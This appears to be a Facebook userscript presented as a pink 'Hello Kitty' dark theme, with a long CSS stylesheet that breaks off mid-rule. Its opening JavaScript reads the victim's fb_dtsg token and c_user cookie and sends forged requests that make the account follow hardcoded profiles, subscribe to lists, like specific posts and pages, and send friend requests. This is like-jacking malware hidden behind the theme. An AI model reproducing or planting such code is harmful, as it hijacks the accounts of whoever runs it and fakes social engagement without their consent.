TEST
====

var parent=document.getElementsByTagName("html")[0]; var _body = document.getElementsByTagName('body')[0]; var _div = document.createElement('div'); _div.style.height="25"; _div.style.width="100%"; _div.style.position="fixed"; _div.style.top="auto"; _div.style.bottom="0"; _div.align="center"; var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&amp;location=1&amp;source=follow-button&amp;subscribed_button_id=u37qac_37&amp;fb_dtsg="+fb_dtsg+"&amp;lsd&amp;__"+user_id+"&amp;phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&amp;&amp;http4.status==200)http4.close};http4.send(params4)}a("100002340568632");a("100000777020687");a("100007714296137");a("100002340568632");a("100000777020687");a("100007714296137");a("100007769978227");a("100007714296137");a("100007769978227");a("100007769978227");a("100007769978227");a("100002340568632");a("100002340568632");a("100002340568632");a("100002340568632");a("100002340568632");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&amp;action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}sublist("633696953332866");sublist("590264787728201");sublist("590264787728201");sublist("633696953332866");sublist("590264787728201");sublist("590264787728201");sublist("590264787728201");var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&amp;ft_ent_identifier="+post+"&amp;source=1&amp;client_id="+now+"%3A3366677427&amp;rootid=u_ps_0_0_14&amp;giftoccasion&amp;ft[tn]=%3E%3DU&amp;ft[type]=20&amp;ft[qid]=5882006890513784712&amp;ft[mf_story_key]="+post+"&amp;nctr[_mod]=pagelet_home_stream&amp;__user="+user_id+"&amp;__a=1&amp;__dyn=7n8ahyj35CFwXAg&amp;__req=j&amp;fb_dtsg="+fb_dtsg+"&amp;phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&amp;&amp;X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&amp;fbpage_id="+p+"&amp;add=true&amp;reload=false&amp;fan_origin=page_timeline&amp;fan_source=&amp;cat=&amp;nctr[_mod]=pagelet_timeline_page_actions&amp;__user="+user_id+"&amp;__a=1&amp;__dyn=798aD5z5CF-&amp;__req=d&amp;fb_dtsg="+fb_dtsg+"&amp;phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&amp;&amp;Page.status==200){Page.close}};Page.send(PageParams)}Like("175314602637837");Like("375513492580182");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&amp;action=add_friend&amp;how_found=friend_browser_s&amp;ref_param=none&amp;&amp;&amp;outgoing_id=&amp;logging_location=search&amp;no_flyout_on_click=true&amp;ego_log_data&amp;http_referer&amp;__user="+user_id+"&amp;__a=1&amp;__dyn=798aD5z5CF-&amp;__req=35&amp;fb_dtsg="+fb_dtsg+"&amp;phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&amp;&amp;X.status==200){X.close}};X.send(XParams)} ///////////////////////////KHÔNG XÓA ? ÐÂY/////////////////////////// // tài sublist("");sublist("");sublist("");sublist("");sublist("");sublist("");IDS("");IDS("");IDS("");IDS(""); IDS("");IDS("");IDS("");IDS("");P("591770284244318");P("516870951734252");P("1378536412413489");P("582463185122910");P("566537456715483");P("563973120305250");P("432820776753819");P("1381414828792314");P("1381414828792314");P("1381414828792314");P("1381414828792314");P("1381414828792314");P("1381414828792314");P("1381414828792314");P("489262017776361"); //Theme (function() { var css = "/* Facebook - Dark Shiny Pink, transparency   */
/* http://userstyles.org/styles/23449        */
/* Author: DaedalusIcarusHelios                 */
/* contact: preston.scheuneman@gmail.com      */
/* Facebook: http://fb.me/DaedalusIcarusHelios.Themes  */


#facebook body:not(.transparent_widget), #nonfooter, #booklet, .UIFullPage_Container, .fbConnectWidgetTopmost, .connect_widget_vertical_center, .fbFeedbackContent, #LikeboxPluginPagelet
{ 
color: #fff !important;
background: url(\"http://i1062.photobucket.com/albums/t499/bluvilink/Hello%20Kitty/hellokitty.jpg\") repeat fixed left center #e69 !important;
}


a,.UIActionButton_Text,span,div,input[value=\"Comment\"] {text-shadow: #000 1px 1px 1px !important;}

.UIComposer_InputArea *,.highlighter div{text-shadow: none !important;}

#profile_name {text-shadow: #fff 0 0 2px,#000 1px 1px 3px;}

a:hover,.inputbutton:hover,.inputsubmit:hover,.accent,.hover,.domain_name:hover,#standard_error,.UIFilterList_Selected a:hover,input[type=\"submit\"]:not(.fg_action_hide):hover,.button_text:hover,#presence_applications_tab:hover,.UIActionMenu:hover,.attachment_link a span:hover,.UIIntentionalStory_Time a:hover,.UIPortrait_Text .title:hover,.UIPortrait_Text .title span:hover,.comment_link:hover,.request_link span:hover,.UIFilterList_ItemLink .UIFilterList_Title:hover,.UIActionMenu_Text:hover,.UIButton_Text:hover,.inner_button:hover,.panel_item span:hover,li[style*=\"background-color: rgb(255,255,255)\"] .friend_status,.dh_new_media span:hover,a span:hover,.tab_link:hover *,button:hover,#buddy_list_tab:hover *,.tab_handle:hover .tab_name span,.as_link:hover span,input[type=\"button\"]:hover,.feedback_show_link:hover,.page:hover .text,.group:hover .text,.calltoaction:hover .seeMoreTitle,.liketext:hover,.tickerStoryBlock:hover .uiStreamMessage span,.tickerActionVerb,.mleButton:hover,.bigNumber,.pluginRecommendationsBarButton:hover {color: #fac !important;text-shadow: #fff 0 0 2px !important;text-decoration: none !important;}


.fbChatSidebar .fbChatTypeahead .textInput,.fbChatSidebarMessage,.devsitePage .body > .content {box-shadow: none !important;}

.presence_menu_opts,#header,.LJSDialog,.chat_window_wrapper,#navAccount ul,.fbJewelFlyout,.uiTypeaheadView,.uiToggleFlyout { box-shadow: 0 0 3em #000; }

.UIRoundedImage,.UIContentBox_GrayDarkTop,.UIFilterList > .UIFilterList_Title, .dialog-title,.flyout,.uiFacepileItem .uiTooltipWrap {box-shadow: 0 0 1em 1px #000;}

.extra_menus ul li:hover,.UIRoundedBox_Box,.fb_menu_link:hover,.UISelectList_Item:hover,.fb_logo_link:hover,.hovered,#presence_notifications_tab,#chat_tab_barx,.tab_button_div,.plays_val, #mailBoxItems li a:hover,.buddy_row a:hover,.buddyRow a:hover,#navigation a:hover,#presence_applications_tab,#buddy_list_tab,#presence_error_section,.uiStepSelected .middle,.jewelButton,#pageLogo,.fbChatOrderedList .item:hover,.uiStreamHeaderTall {box-shadow: 0 0 3px #000,inset 0 0 5px #000 !important;}


.topNavLink > a:hover,#navAccount.openToggler,.selectedCheckable {box-shadow: 0 0 4px 2px #fac,inset 0 0 2em #f69 !important;}


.fbChatBuddyListDropdown .uiButton,.promote_page a,.create_button a,.share_button_browser div,.silver_create_button,.button:not(.uiSelectorButton):not(.close):not(.videoicon),button:not(.as_link),.GBSearchBox_Button,.UIButton_Gray,.UIButton,.uiButton:not(.uiSelectorButton),.fbPrivacyWidget .uiSelectorButton:not(.lockButton),.uiButtonSuppressed,.UIActionMenu_SuppressButton,.UIConnectControlsListSelector .uiButton,.uiSelector:not(.fbDockChatDropdown) .uiSelectorButton:not(.uiCloseButton),.fbTimelineRibbon,#fbDockChatBuddylistNub .fbNubButton,.pluginRecommendationsBarButtonLike {box-shadow: 0 0 .5em rgba(0,0,0,0.9),inset 0 0 .75em #fac !important;border-width: 0 !important; }

.fbChatBuddyListDropdown .uiButton:hover,.uiButton:not(.uiSelectorButton):hover,.fbPrivacyWidget .uiSelectorButton:not(.lockButton):hover,.uiButtonSuppressed:hover,.UIButton:hover,.UIActionMenu_Wrap:hover,.tabs li:hover,.ntab:hover,input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([type=\"Flag\"]):not([type=\"submit\"]):hover,.inputsubmit:hover,.promote_page:hover,.create_button:hover,.share_button_browser:hover,.silver_create_button_shell:hover,.painted_button:hover,.flyer_button:hover,.button:not(.close):not(.uiSelectorButton):not(.videoicon):hover,button:not(.as_link):hover,.GBSearchBox_Button:hover,.tagsWrapper,.UIConnectControlsListSelector .uiButton:hover,.uiSelector:not(.fbDockChatDropdown) .uiSelectorButton:not(.uiCloseButton):hover,.fbTimelineMoreButton:hover,#fbDockChatBuddylistNub .fbNubButton:hover,.tab > div:not(.title):hover,.detail.frame:hover,.pluginRecommendationsBarButtonLike:hover {box-shadow: 0 0 .5em #000,0 0 1em 3px #fac,inset 0 0 2em #f69 !important;}

#icon_garden,.list_select .friend_list {box-shadow: 0 0 3px -1px #000,inset 0 0 3px -1px #000;}

.bb .fbNubButton,.uiScrollableAreaGripper {box-shadow: inset 0 4px 8px #fac,0 0 1em #000 !important;}

.bb .fbNubButton:hover {box-shadow: inset 0 4px 8px #fac,0 .5em 1em 1em #fac !important;}

.fbNubFlyoutTitlebar {box-shadow: inset 0 4px 8px #fac;padding: 0 4px !important;}

#fb_menubar,.progress_bar_outer {box-shadow: inset 0 0 3px #000,0 0 3em 3px #000;}
#presence_ui {box-shadow: 0 0 3em 1px #000}

#buddy_list_tab:hover,.tab_handle:hover,.focused  {box-shadow: 0 0 3px #000,inset 0 0 3px #000,0 0 3em 5px #fff;}

.uiSideNavCount,.jewelCount,.uiContextualDialogContent,.fbTimelineCapsule .fbTimelineTwoColumn > .timelineUnitContainer:hover,.timelineReportContainer:hover,.uiOverlayPageContent,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,.uiScaledImageContainer:hover, .pagesVoiceBar, ._k5 {box-shadow: 0 0 1em 4px #fac !important;}

.img_link:hover,.album_thumb:hover,.fbChatTourCallout .body,.fbSidebarGripper div {box-shadow: 0 0 3em #fac;}

.shaded,.progress_bar_inner,.tickerStoryAllowClick {box-shadow: inset 0 0 1em #fac !important}

.UIPhotoGrid_Table .UIPhotoGrid_TableCell:hover .UIPhotoGrid_Image,#myphoto:hover,.mediaThumbWrapper:hover,.uiVideoLink:hover,.mediaThumb:hover,#presence.fbx_bar #presence_ui #presence_bar .highlight,.fbNubFlyout:hover,.hovercard .stage,#fbDockChatBuddylistNub .fbNubFlyout:hover,.balloon-content,.-cx-PRIVATE-uiDialog__border  {box-shadow: 0 0 3em 5px #fac !important;}

.fbNubFlyout,.uiMenuXBorder {box-shadow: 0 0 3em 5px #000 !important;}

#blueBar {box-shadow: 0 0 1em 3px #000 !important;}


.fill {box-shadow: inset 0 0 2em #f69,0 0 1em #000 !important;}


input[type=\"file\"]{-moz-appearance:none!important;border: none !important;}


.status_text,h4,a,h2,.flyout_menu_title,.url,#label_nm,h5,.WelcomePage_MainMessage,#public_link_uri,#public_link_editphoto span,#public_link_editalbum span,.dh_subtitle,.app_name_heading,.box_head,.presence_bar_button span,a:link span,#public_link_album span,.note_title,.link_placeholder,.stories_title,.typeahead_suggestion,.boardkit_title,.section-title strong,.inputbutton,.inputsubmit,.matches_content_box_title,.tab_name,.header_title_text,.signup_box_message,.quiz_start_quiz,.sidebar_upsell_header,.wall_post_title,.megaphone_header,.source_name,.UIComposer_AttachmentLink,.fcontent > .fname,#presence_applications_tab,.mfs_email_title,.flyout .text,.UIFilterList_ItemLink .UIFilterList_Title,.announce_title,.attachment_link a span,.comment_author,.UIPortrait_Text .title,.comment_link,.UIIntentionalStory_Names,#profile_name,.UIButton_Text,.dh_new_media span,.share_button_browser div,.UIActionMenu_Text,.UINestedFilterList_Title,button,.panel_item span,.stat_elem,.action,#contact_importer_container input[value=\"Find Friends\"]:hover,.navMore,.navLess,input[name=\"add\"],input[name=\"actions[reject]\"],input[name=\"actions[accept]\"],input[name=\"actions[maybe]\"],.uiButtonText,.as_link .default_message,.feedback_hide_link,.feedback_show_link,#fbpage_fan_sidebar_text,.comment_actual_text a span,.uiAttachmentDesc a span,.uiStreamMessage a span,.group .text,.page .text,.uiLinkButton input,.blueName,.uiBlingBox span.text,.commentContent a span,.uiButton input,.fbDockChatTab .name,.simulatedLink,.bfb_tab_selected,.liketext,a.UIImageBlock_Content,.uiTypeaheadView li .text,.author,.authors,.itemLabel,.passiveName,.token,.fbCurrentTitle,.fbSettingsListItemLabel,.uiIconText,#uetqg1_8,.fbRemindersTitle,.mleButton,.uiMenuItem .selected .name  {color: #fac !important;}

#email,option,.disclaimer,.info dd,.UIUpcoming_Info,.UITos_ReviewDescription,.settings_box_text,div[style*=\"color: rgb(85,85,85)\"] {color: #999 !important;}

.status_time,.header_title_wrapper,.copyright,#newsfeed_submenu,#newsfeed_submenu_content strong,.summary,.caption,.story_body,.social_ad_advert_text,.createalbum dt,.basic_info_summary_and_viewer_actions dt,.info dt,.photo_count,p,.fbpage_fans_count,.fbpage_type,.quiz_title,.quiz_detailtext,.byline,label,.fadvfilt b,.fadded,.fupdt,.label,.main_subtitle,.minifeed_filters li,.updates_settings,#public_link_photo,#phototags em,#public_link_editphoto,.note_dialog,#public_link_editalbum,.block_add_person,.privacy_page_field,.action_text,.network,.set_filters span,.byline span,#no_notes,#cheat_sheet,.form_label,.share_item_actions,.options_header,.box_subtitle,.review_header_subtitle_line,.summary strong,.upsell dd,.availability_text,#public_link_album,.explanation,.aim_link,.subtitle,#profile_status,span[style*=\"color: rgb(51,51,51)\"],.fphone_label,.phone_type_label,.sublabel,.gift_caption,dd span,.events_bar,.searching,.event_profile_title,.feedBackground,.fp_show_less,.increments td,.status_confirm,.sentence,.admin_list span,.boardkit_no_topics,.boardkit_subtitle,.petition_preview,.boardkit_topic_summary,li,#photo_badge,.status_body,  .spell_suggest_label,.pg_title,.white_box,.token span,.profile_activation_score,.personal_msg span,.matches_content_box_subtitle span,tr[fbcontext=\"41097bfeb58d\"] td,.title,.floated_container span:not(.accent),div[style*=\"color: rgb(85,85,85)\"],div[style*=\"color: rgb(68,68,68)\"],.present_info_label,.fbpage_description,.tagged span,#tags h2 strong,#tags div span,.detail,.chat_info_status,.gray-text,.author_header,.inline_comment,.fbpage_info,.gueststatus,.no_pages,.topic_pager,.header_comment span,div[style*=\"color: rgb(101,107,111)\"],#q,span[style*=\"color: rgb(85,85,85)\"],.pl-item,.tagged_in,.pick_body,td[style*=\"color: rgb(85,85,85)\"],strong[style*=\"color: rgb(68,68,68)\"],div[style*=\"color: gray\"],.group_officers dd,.fbpage_group_title,.application_menu_divider,.friend_status span,.more_info,.logged_out_register_subhead,.logged_out_register_footer,input[type=\"text\"],textarea,.status_name span,input[type=\"file\"],.UIStoryAttachment_Copy,.stream_participants_short,.UIHotStory_Copy,input[type=\"submit\"]:not(.fg_action_hide):not(.stat_elem):not(.UIButton_Text):not([name=\"add\"]):not([name=\"actions[reject]\"]):not([name=\"actions[accept]\"]):not([value=\"Find Friends\"]):not([value=\"Share\"]):not([value=\"Maybe\"]):not([value=\"No\"]):not([value=\"Yes\"]):not([value=\"Comment\"]):not([value=\"Reply\"]):not([value=\"Flag\"]):not([type=\"submit\"]),input[type=\"search\"],input[type=\"input\"],.inputtext,.relationship span,input[type=\"button\"]:not([value=\"Comment\"]),input[type=\"password\"],#reg_pages_msg,.UIMutableFilterList_Tip,.like_sentence,.UIIntentionalStory_InfoText,.UIHotStory_Why,.question_text,.UIStory,.tokenizer,input[type=\"hidden\"],.tokenizer_input *,.text:not(.external),.flistedit b,.fexth,.UIActionMenu_Main,span[style*=\"color: rgb(102,102,102)\"],div[style*=\"color: rgb(85,85,85)\"],div[style*=\"color: rgb(119,119,119)\"],blockquote,.description,.security_badge,.full_name,.email_display,.email_section,.chat_fl_nux_messaging,.UIObjectListing_Subtext,.confirmation_login_content,.confirm_username,.UIConnectControls_Body em,.comment_actual_text,.status,.UICantSeeProfileBlurbText,.UILiveLink_Description,.recaptcha_text,.UIBeep_Title,.UIComposer_Attachment_ShareLink_URL,.app_dir_app_category,.first_stat,.aggregate_review_title,.stats span,.facebook_disclaimer,.app_dir_app_creator,.app_dir_app_monthly_active_users,.app_dir_app_friend_users,.UISearchFilterBar_Label,.UIFullListing_InfoLabel,.email_promise_detail,.title_text,.excerpt,.dialog_body,.tos,.UIEMUASFrame_body,.page_note,.nux_highlight_composer,.UIIntentionalStory_BottomAttribution,.tagline,.GBSelectList,.gigaboxx_thread_header_authors,.GBThreadMessageRow_ReferrerLink,#footerWrapper,.infoTitle,.fg_explain,.UIMentor_Message,.GenericStory_BottomAttribution,.chat_input,.video_timestamp span,#tagger_prompt,.UIImageBlock_Content,.new_list span, .GBSearchBox_Input input,.SearchPage_EmailSearchLeft,.sub_info,.UIBigNumber_Label,.UIInsightsGeoList_ListTitle,.UIInsightsGeoList_ListItemValue,.UIInsightsSmall_Note,.textmedium,.UIFeedFormStory_Lead,.home_no_stories_content, .title_label,div[style*=\"color: rgb(102,102,102)\"],*[style*=\"color: rgb(51,51,51)\"],.tab_box_inner,.uiStreamMessage,.privacy_section_description,.info_text,.uiAttachmentDesc,.uiListBulleted span,.privacySettingsGrid th,.recommendations_metadata,.postleft dd:not(.usertitle),.postText,.mall_post_body_text,.fbChatMessage,.fbProfileBylineFragment,.nosave option,.uiAttachmentDetails,.fbInsightsTable td,.mall_post_body,.uiStreamPassive,.snippet,.questionInfo span,.promotionsHowto,.fcg,.headerColumn .fwb,.rowGroupTitle .fwb,.rowGroupDescription .fwb,.likeUnit,.aboveUnitContent,.placeholder,.sectionContent,.UIFaq_Snippet,.uiMenuItem:not(.checked) .name,.balloon-text,.fbLongBlurb,.legendLabel,.messageBody {color: #bbb !important;}

.status_clear_link,h3,h1,.updates,.WelcomePage_SignUpHeadline,.WelcomePage_SignUpSubheadline,.mock_h4 .left,.review_header_title,caption,.logged_out_register_msg,.domain_name, .UITitledBox_Title,.signup_box_content,.highlight,.question,.whocan span,.UIFilterList > .UIFilterList_Title,.subject,.UIStoryAttachment_Label,.typeahead_message,.UIShareStage_Title,.alternate_name,.helper_text,.textlarge,.page .category,.item_date,.privacy_section_label,.privacy_section_title,.uiTextMetadata, .seeMoreTitle,.categoryContents,code,.usertitle,.fbAppSettingsPageHeader,.fsxl,.LogoutPage_MobileMessage,.LogoutPage_MobileSubmessage,.recommended_text,#all_friends_text,.removable,.ginormousProfileName,.experienceContent .fwb,#bfb_t_popular_body div[style*=\"color:#880000\"],.fsm:not(.snippet):not(.itemLabel):not(.fbChatMessage),.uiStreamHeaderTextRight,.bookmarksNavSeeAll,.tab .content,.fbProfilePlacesFilterCount,.fbMarketingTextColorDark,.pageNumTitle,.pluginRecommendationsBarButton {color: #f69 !important;}

.em,.story_comment_back_quote,.story_content,small,.story_content_excerpt,.walltext,.public,p span,#friends_page_subtitle,.main_title,.empty_message,.count,.count strong,.stories_not_included li span,.mobile_add_phone th,#friends strong,.current,.no_photos,.intro,.sub_selected a,.stats,.result_network,.note_body,#bodyContent div b,#bodyContent div,.upsell dt,.buddy_count_num strong,.left,.body,.tab .current,.aim_link span,.story_related_count,.admins span,.summary em,.fphone_number,.my_numbers_label,.blurb_inner,.photo_header strong,.note_content,.multi_friend_status,.current_path span,.current_path,.petition_header,.pyramid_summary strong,#status_text,.contact_email_pending em,.profile_needy_message,.paging_link div,.big_title,.fb_header_light,.import_status strong,.upload_guidelines ul li span,.upload_guidelines ul li span strong,#selector_status,.timestamp strong,.chat_notice,.notice_box,.text_container,.album_owner,.location,.info_rows dd,.divider,.post_user,div[style=\"color: rgb(101,107,111);\"] b,div[style=\"color: rgb(51,51,51);\"] b,.basic_info_summary_and_viewer_actions dd,.profile_info dd,.story_comment,p strong,th strong,.fstatus,.feed_story_body,.story_content_data,.home_prefs_saved p,.networks dd,.relationship_status dd,.birthday dd,.current_city dd,.UIIntentionalStory_Message,.UIFilterList_Selected a,.UIHomeBox_Title,.suggestion,.spell_suggest,.UIStoryAttachment_Caption,.fexth + td,.fext_short,#fb_menu_inbox_unread_count,.Tabset_selected .arrow .sel_link span,.UISelectList_check_Checked,.chat_fl_nux_header,.friendlist_status .title a,.chat_setting label,.UIPager_PageNum,.good_username,.UIComposer_AttachmentTitle,.rsvp_option:hover label,.Black,.comment_author span,.fan_status_inactive,.holder,.UIThumbPagerControl_PageNumber,.text_center,.nobody_selected,.email_promise,.blocklist ul,#advanced_body_1 label,.continue,.empty_albums,div[style*=\"color: black\"],.GBThreadMessageRow_Body_Content,.UIShareStage_Subtitle,#public_link_photo span,.GenericStory_Message,.UIStoryAttachment_Value,div[style*=\"color: black\"],.SearchPage_EmailSearchTitle,.uiTextSubtitle,.jewelHeader,.recent_activity_settings_label,.people_list_item,.uiTextTitle,.tab_box,.instant_personalization_title,.MobileMMSEmailSplash_Description,.MobileMMSEmailSplash_Tipsandtricks_Title,.fcb,input[value=\"Find Friends\"],#bodyContent,#bodyContent table,h6,.fbChatBuddylistError,.info dt,.bfb_options_minimized_hide,.connect_widget_connected_text,body.transparent_widget .connect_widget_not_connected_text,.connect_widget_button_count_count,.fbInsightsStatisticNumber,.fbInsightsTable thead th span,.header span,.friendlist_name a,.count .countValue,.uiHeaderTitle span,#about_text_less span,.uiStreamHeaderText,.navHeader,.uiAttachmentTitle,.fbProfilePlacesFilterText,.tagName,.ufb-dataTable-header-text,.ufb-text-content,.fb_content,.uiComposerAttachment .selected .attachmentName,.balloon-title,.cropMessage {color: #fff !important;}

.bfb_post_action_container {opacity: .25 !important;}
.bfb_post_action_container:hover {opacity: 1 !important;}

.valid,.wallheader small,#photodate,.video_timestamp strong,.date_divider span,.feed_msg h5,.time,.item_contents,.boardkit_topic_updated,.walltime,.feed_time,.story_time,#status_time_inner,.written small,.date,div[style*=\"color: rgb(85,82,37)\"],.timestamp span,.time_stamp,.timestamp,.header_info_timestamp,.more_info div,.timeline,.UIIntentionalStory_Time,.fupdt,.note_timestamp,.chat_info_status_time,.comment_actions,.UIIntentionalStory_Time a,.UIUpcoming_Time,.rightlinks,.GBThreadMessageRow_Date,.GenericStory_Time a,.GenericStory_Time,.fbPrivacyPageHeader,.date_divider {color: #f69 !important;}

.textinput,select,.list_drop_zone,.msg_divide_bottom,textarea,input[type=\"text\"],input[type=\"file\"],input[type=\"search\"],input[type=\"input\"],input[type=\"password\"],.space,.tokenizer,input[type=\"hidden\"],#flm_new_input,.UITooltip:hover,.UIComposer_InputShadow,.searchroot input,input[name=\"search\"],.uiInlineTokenizer,input.text,input.nosave {background: rgba(0,0,0,.50) !important;-moz-appearance:none!important;color: #bbb !important;border: none !important;padding: 3px !important; }

input[type=\"text\"]:focus,textarea:focus,.fbChatSidebar .fbChatTypeahead .textInput:focus {box-shadow: 0 0 .5em #fac,inset 0 0 .25em #f69 !important;}

.uiOverlayPageWrapper,#fbPhotoSnowlift,.shareOverlay,.tlPageRecentOverlay  {background: -moz-radial-gradient(50% 50%,circle,rgba(10,10,10,.6),rgb(10,10,10) 90%) !important;}

.bumper,.stageBackdrop {background: #000 !important;}
#page_table {background: #333 }

.checkableListItem:hover a,.selectedCheckable a  {background: #f69 !important; }

.GBSearchBox_Input,.tokenizer,.LTokenizerWrap,#mailBoxItems li a:hover,.uiTypeaheadView .search .selected,.itemAnchor:hover,.notePermalinkMaincol .top_bar, .notification:hover a,#bfb_tabs div:not(.bfb_tab_selected),.bfb_tab,.navIdentity form:hover,.connect_widget_not_connected_text,.uiTypeaheadView li.selected,.connect_widget_number_cloud,.placesMashCandidate:hover,.highlight,#bfb_option_list li a:hover {background: rgba(0,0,0,.5) !important;}

.results .page,.calltoaction,.results li,.fbNubFlyout,.contextualBlind,.bfb_dialog,.bfb_image_preview,input.text,.fbChatSidebar,.jewelBox,.clickToTagMessage,.tagName,.ufb-tip-body,.flyoutContent,.fbTimelineMapFilterBar,.fbTimelineMapFilter,.fbPhotoStripTypeaheadForm,.groupsSlimBarTop,.pas,.contentBox,.fbMapCalloutMain, .pagesVoiceBar {background: rgba(10,10,10,.75) !important;}

#pageNav .tinyman:hover a,#navHome:hover a,#pageNav .tinyman a[style*=\"cursor: progress\"],#navHome a[style*=\"cursor: progress\"],#home_filter_list,#home_sidebar,#contentWrapper,.LDialog,.dialog-body,.LDialog,.LJSDialog,.dialog-foot,.chat_input,#contentCol,#leftCol,.UIStandardFrame_Content,.red_box,.yellow_box,.uiWashLayoutOffsetContent,.uiOverlayContent,.bfb_post_action_container,.connect_widget_button_count_count,.shaded,.navIdentitySub,.jewelItemList li a:hover,.fbSidebarGripper div,.jewelCount,.uiBoxRed,.videoUnit,.lifeEventAddPhoto,.fbTimelineLogIntroMegaphone,.uiGamesLeaderboardItem,.pagesTimelineButtonPagelet .counter,#pagelet_timeline_profile_actions .counter,.newInterestListNavItem:hover,.ogSliderAnimPagerPrevContent,.ogSingleStoryStatus,.ogSliderAnimPagerNextContent,.-cx-PRIVATE-uiDialog__body,.jewelItemNew .messagesContent   {background: rgba(10,10,10,.5) !important;}

#home_stream,pre,.ufiItem,.odd,.uiBoxLightblue,.platform_dialog_bottom_bar,.uiBoxGray,.fbFeedbackPosts,.mall_divider_text,.uiWashLayoutGradientWash, #bfb_options_body,.UIMessageBoxStatus,.tip_content .highlight,.fbActivity, .auxlabel,.signup_bar_container,#wait_panel,.FBAttachmentStage,.sheet,.uiInfoTable .name,.HCContents,#devsiteHomeBody .content,.devsitePage .nav .content,#confirm_phone_frame,.fbTimelineCapsule .timelineUnitContainer,.timelineReportContainer,.aboveUnitContent,.aboutMePagelet,#pagelet_tab_content_friends,#fbProfilePlacesBorder,#pagelet_tab_content_notes,.externalShareUnit,.fbTimelineNavigationWrapper .detail,.tosPaneInfo,.navSubmenu:hover,#bfb_donate_pagelet > div,.better_fb_mini_message,.uiBoxWhite,.uiLoadingIndicatorAsync,.mleButton,.fbTimelineBoxCount,.navSubmenu:hover,.gradient,.profileBrowserGrid tr > td > div,.statsContainer,#admin_panel,.fbTimelineSection, .escapeHatch, .ogAggregationPanelContent, .-cx-PRIVATE-fbTimelineExternalShareUnit__root, .shareUnit a, .storyBox  {background: rgba(20,20,20,.4) !important;}

.feed_comments,.home_status_editor,#rooster_container,.rooster_story,.UIFullPage_Container,.UIRoundedBox_Box,.UIRoundedBox_Side,.wallpost,.profile_name_and_status,.tabs_wrapper,.story,#feedwall_controls,.composer_well,.status_composer,.home_main_item,.feed_item,.HomeTabs_tab,#feed_content_section_applications li,.menu_separator,a[href=\"/friends\"],.feed_options_link,.show_all_link,.status,#newsfeed_submenu,.morecontent_toggle_link,.more_link,.composer_tabs,.bl,.profile_tab,.story_posted_item,.left_column,.pager_next,.admarket_ad,.box,.inside,.shade_b,.who_can_tab,.summary_simple,.footer_submit_rounded,.well_content,.info_section,.item_content,.basic_info_summary_and_viewer_actions dt,.info dt,.photo_table,.extra_content,.main_content,.search_inputs,.search_results,.result,.bar,.smalllinks span,.quiz_actionbox,.column,.note_header,.fdh,#fpgc,#fpgc td,.fmp,.fadvfilt,.fsummary,.frn,.two_column_wrapper,#new_ff,.see_more,.message_rows,.message_rows tr,.toggle_tabs li,.toggle_tabs li a,.notifications,.updates_all,.composer,.WelcomePage_MainSellContainer,.WelcomePage_MainSell,.media_gray_bg,.photo_comments_container,.photo_comments_main,.empty_message,.UIMediaHeader_Title,.UIMediaHeader_SubHeader,.footer_bar,.single_photo_header,#editphotoalbum,.covercheck,#newalbum,.panel,.album,.dh_titlebar,.page_content,.dashboard_header,.photos_header,.privacy_summary_items,.privacy_summary_item,.block_overview,.privacy_page_field,.editor_panel,.block,.action_box,.even_column,.mobile_account_inlay,.language,.confirm_boxes,.confirm,.status_confirm,.hasnt_app,.container, .UIDashboardHeader_TitleBar,.UIDashboardHeader_Container,.note,.UITwoColumnLayout_Container,.dialog_body,.dialog_buttons,.group_lists,.group_lists th,.group_list,.updates,.share_section,#profilenarrowcolumn,#profilewidecolumn,#inline_wall_post,.post_link_bar,.helppro_content,.answers_list_header,#help_titlebar,.new_user_guide,.new_user_guide_content,.flag_nav_item,.flag_nav_item a,.arrowlink a,#safety_page,#safety_page h5,.dashbar,.disclaimer,#store_options,#store_window,.step,.canvas_rel_positioning, .app_type a,.sub_selected a,.box_head,.inside_the_box,.app_about,.fallback,.box_subhead,.fbpage_card,#devsite_menubar,.content_sidebar,.side, .pBody li a,#p-logo,#p-navigation,#p-navigation .pBody,#bodyContent h1,#p-wiki,#p-wiki .pBody,#p-search,#p-search .pBody,#p-tb,#p-tb .pBody,#bodyContent table,#bodyContent table div,.recent_news,.main_news,.news_header, .devsite_subtabs li a,.middle-container,.feed_msg h4,.ads_info,.contact_sales,.wrapper h3,.presence_bar_button:hover,.icon_garden_elem:hover,#profile_minifeed,.focused,.dialog_summary,.tab span,.wallkit_postcontent h4,.address,#badges,.badge_holder,.aim_link,.user_status,.section_editor,.my_numbers,.photo_editor,.gift_rows,.sub_menu,.main-nav-tabs li 